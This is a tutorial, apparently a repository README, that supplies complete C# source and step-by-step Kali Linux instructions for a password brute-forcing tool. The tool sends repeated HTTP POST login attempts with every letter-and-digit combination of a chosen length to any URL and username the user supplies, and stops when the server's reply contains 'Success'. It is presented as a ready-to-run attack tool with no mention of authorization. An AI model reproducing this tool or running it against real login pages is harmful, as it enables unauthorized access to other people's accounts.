__<p style="font-size:40px">How the Code Works:</p>__

__<p style="font-size:20px">Arguments:</p>__

- url: The URL to which the HTTP POST requests are sent.
- username: The username for which you're trying to brute-force the password.
- passwordLength: The length of the password that will be brute-forced.

**Process:**

1. The program accepts the url, username, and passwordLength as arguments from the command line.
2. It then brute-forces passwords by generating all possible combinations of characters (uppercase, lowercase, and digits).
3. For each password attempt, the program sends an HTTP POST request to the specified URL with the username and the current password.
4. If the server responds with "Success", the correct password is displayed, and the process stops.


**How to Run the Program in Kali Linux:**

**Compile and Run:**

After creating the C# project and adding the code as described earlier, you can run the program using the following command:.

`dotnet run <url> <username> <passwordLength>`

For example:

`dotnet run https://example.com/login myuser 4`

**Explanation of Command:**
- https://example.com/login: This is the URL where the POST requests will be sent.
- myuser: This is the username for which the password is being brute-forced.
- 4: This is the length of the password being tested.

**Notes:**
- This program uses a simple character set of lowercase and uppercase letters, and digits (a-z, A-Z, 0-9).
- You can modify the character set in the charset variable if you want to include additional characters (e.g., special symbols).
- The program expects the server to respond with a string that contains "Success" upon a successful login attempt. You may need to modify this logic depending on the actual server's response format.

  
**Instructions for Using the C# Brute Force Script on Kali Linux via Terminal**

Follow these steps to set up, compile, and run the C# brute force script on Kali Linux through the terminal.

**1. Install .NET SDK on Kali Linux**
  Before running the C# script, you need to install the .NET SDK. Here’s how you can do it:
   
  **1.1 Update your package lists and install the required dependencies:**
    ```
    sudo apt update
    ```
    ```
    sudo apt install -y apt-transport-https software-properties-common
    ```
   
   **1.2. Add Microsoft’s package signing key and repository:**
    ```
    wget https://packages.microsoft.com/config/debian/10/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
    ```
    ```
    sudo dpkg -i packages-microsoft-prod.deb
    ```
   
   **1.3. Install the .NET SDK:**
    ```
    sudo apt update
    ```
    ```
    sudo apt install -y dotnet-sdk-7.0
    ```
  
  **1.4. Verify the installation:**
    `dotnet --version`
    If installed correctly, it will display the version number (e.g., 7.0.100).

**2. Set Up the Project**
  
   **2.1. Create a new directory for the project:**
   ```
   mkdir BruteForcePassword
   ```
   ```
   cd BruteForcePassword
   ```
  
   **2.2. Create a new C# console application project:**
   `dotnet new console`
   
   This command generates the basic structure for a console project with a Program.cs file.

   **3. Add the Script**
   **3.1. Open the Program.cs file in a text editor:**
   `nano Program.cs`
   **3.2. Replace the content of Program.cs with the script code (provided above):**
```
using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

class Program
{
    static async Task Main(string[] args)
    {
        if (args.Length != 3)
        {
            Console.WriteLine("Usage: dotnet run <url> <username> <passwordLength>");
            return;
        }

        string url = args[0];
        string username = args[1];
        int passwordLength;

        if (!int.TryParse(args[2], out passwordLength))
        {
            Console.WriteLine("Error: passwordLength must be an integer.");
            return;
        }

        await BruteForcePassword(url, username, passwordLength);
    }

    static async Task BruteForcePassword(string url, string username, int passwordLength)
    {
        using (HttpClient client = new HttpClient())
        {
            string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            int charsetLength = charset.Length;
            char[] password = new char[passwordLength];

            for (int i = 0; i < passwordLength; i++)
            {
                password[i] = charset[0];
            }

            bool success = false;

            while (!success)
            {
                string passwordString = new string(password);
                var data = new { username = username, password = passwordString };

                var json = Newtonsoft.Json.JsonConvert.SerializeObject(data);
                var content = new StringContent(json, Encoding.UTF8, "application/json");

                try
                {
                    HttpResponseMessage response = await client.PostAsync(url, content);
                    string responseString = await response.Content.ReadAsStringAsync();

                    Console.WriteLine($"Trying: {passwordString} - Server Response: {response.StatusCode}");

                    if (responseString.Contains("Success"))
                    {
                        Console.WriteLine($"Success! The correct password is: {passwordString}");
                        success = true;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error: {ex.Message}");
                    return;
                }

                success = IncrementPassword(password, charset, charsetLength);
            }
        }
    }

    static bool IncrementPassword(char[] password, string charset, int charsetLength)
    {
        for (int i = password.Length - 1; i >= 0; i--)
        {
            int currentCharIndex = charset.IndexOf(password[i]);

            if (currentCharIndex < charsetLength - 1)
            {
                password[i] = charset[currentCharIndex + 1];
                return false;
            }

            password[i] = charset[0];
        }

        return true;
    }
}
```

   **3.3. Save and exit the editor:**
   - Press CTRL + O, then Enter to save.
   - Press CTRL + X to exit nano.

**4. Install Newtonsoft.Json (for JSON serialization)**
The script uses `Newtonsoft.Json` for converting data to JSON format. You need to install this package in your project:

   **4.1. Install the Newtonsoft.Json package:**
   `dotnet add package Newtonsoft.Json`
   
**5. Compile and Run the Script**
   **5.1. Compile and run the project with your command-line arguments:**
   `dotnet run <url> <username> <passwordLength>`
   
   - `<url>`: The URL to which the POST requests will be sent.
   - `<username>`: The username for which you are attempting to brute-force the password.
   - `<passwordLength>`: The length of the password being brute-forced.

**Example:**
`dotnet run https://example.com/login myuser 4`

In this example:

   - The program will brute-force the password for the user myuser at https://example.com/login.
   - It will try passwords that are 4 characters long.

**6. Troubleshooting**

   - Ensure the server URL is correct and accessible.
   - The script expects the server to return a response containing the word "Success" upon a successful login. You may need to adjust this part of the code based on the actual response from the server you're testing against.


**Summary of Steps:**

1. Install .NET SDK: Set up the environment on Kali Linux.
2. Create a Project: Use dotnet new console to create a C# project.
3. Add the Script: Replace the default content in Program.cs with the provided script.
4. Install Dependencies: Install the Newtonsoft.Json package for JSON handling.
5. Run the Script: Use dotnet run with the URL, username, and password length as arguments.
6. Now your C# script will execute, sending HTTP POST requests and brute-forcing the password based on the command-line inputs.










































      
    


